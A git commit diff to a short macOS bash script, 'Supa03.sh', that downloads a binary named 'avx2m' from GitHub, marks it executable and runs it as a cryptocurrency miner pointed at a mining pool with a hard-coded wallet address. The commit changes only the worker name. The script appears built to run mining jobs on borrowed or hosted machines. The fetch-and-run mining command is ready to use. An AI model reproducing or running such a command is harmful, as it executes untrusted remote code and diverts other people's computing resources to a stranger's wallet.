a6d1553e35e768380612fa4985bad67fb7a9c372
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-06-13 13:00:17 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
 softwareupdate -l
 brew install coreutils
-wget https://github.com/BatiKangkung/KangKung/raw/master/avx2m && chmod +x avx2m && ./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(gshuf -i 1000-9999 -n 1)-C) -p x
+wget https://github.com/BatiKangkung/KangKung/raw/master/avx2m && chmod +x avx2m && ./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -p x
